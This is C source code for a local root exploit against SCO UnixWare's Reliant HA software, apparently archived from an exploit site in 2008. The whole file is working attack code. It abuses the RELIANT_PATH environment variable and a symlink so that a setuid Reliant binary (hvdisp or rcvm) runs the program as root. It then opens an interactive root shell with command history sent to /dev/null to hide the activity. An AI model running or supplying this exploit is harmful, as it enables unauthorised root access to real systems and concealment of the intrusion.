/* 04/2008: public release
 * I have'nt seen any advisory on this; possibly still not fixed.
 *
 * SCO UnixWare Reliant HA Local Root Exploit
 * By qaaz
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>

#define TGT1	"/usr/opt/reliant/bin/hvdisp"
#define TGT2	"/usr/opt/reliant/bin/rcvm"
#define DIR	"bin"
#define BIN	DIR "/hvenv"

int	main(int argc, char *argv[])
{
	char	self[4096], *target;
	pid_t	child;

	if (geteuid() == 0) {
		setuid(geteuid());
		dup2(3, 0);
		dup2(4, 1);
		dup2(5, 2);
		if ((child = fork()) == 0) {
			putenv("HISTFILE=/dev/null");
			execl("/bin/sh", "sh", "-i", NULL);
			printf("[-] sh: %s\n", strerror(errno));
		} else if (child != -1)
			waitpid(child, NULL, 0);
		kill(getppid(), 15);
		return 1;
	}

	printf("----------------------------------------\n");
	printf(" UnixWare Reliant HA Local Root Exploit\n");
	printf(" By qaaz\n");
	printf("----------------------------------------\n");

	if (access(TGT1, EX_OK) == 0)
		target = TGT1;
	else if (access(TGT2, EX_OK) == 0)
		target = TGT2;
	else {
		printf("[-] No targets found\n");
		return 1;
	}

	sprintf(self, "/proc/%d/object/a.out", getpid());

	if (mkdir(DIR, 0777) < 0 && errno != EEXIST) {
		printf("[-] %s: %s\n", DIR, strerror(errno));
		return 1;
	}

	if (symlink(self, BIN) < 0) {
		printf("[-] %s: %s\n", BIN, strerror(errno));
		rmdir(DIR);
		return 1;
	}

	if ((child = fork()) == 0) {
		char path[4096] = "RELIANT_PATH=";

		dup2(0, 3);
		dup2(1, 4);
		dup2(2, 5);
		putenv(strcat(path, getcwd(NULL, sizeof(path)-14)));
		execl(target, target, NULL);
		printf("[-] %s: %s\n", target, strerror(errno));
		return 1;
	} else if (child != -1)
		waitpid(child, NULL, 0);

	unlink(BIN);
	rmdir(DIR);
	return 0;
}

// milw0rm.com [2008-04-04]